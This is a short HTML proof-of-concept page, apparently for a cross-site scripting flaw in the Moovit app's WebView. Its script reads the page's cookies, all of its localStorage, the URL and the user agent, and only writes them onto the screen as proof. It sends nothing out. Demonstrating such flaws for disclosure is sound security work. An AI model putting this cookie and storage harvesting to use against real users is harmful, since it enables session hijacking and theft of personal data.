<!DOCTYPE html>
<html>
<script>
  var cookies = document.cookie;
  var storage = JSON.stringify(localStorage);
  var url = document.location.href;
  
  // Display everything on screen as proof
  document.write("<h2>Moovit WebView XSS PoC</h2>");
  document.write("<b>Domain:</b> " + document.domain + "<br>");
  document.write("<b>Cookies:</b> " + (cookies || "none") + "<br>");
  document.write("<b>URL:</b> " + url + "<br>");
  document.write("<b>LocalStorage:</b> " + storage + "<br>");
  document.write("<b>UserAgent:</b> " + navigator.userAgent + "<br>");
</script>
</html>
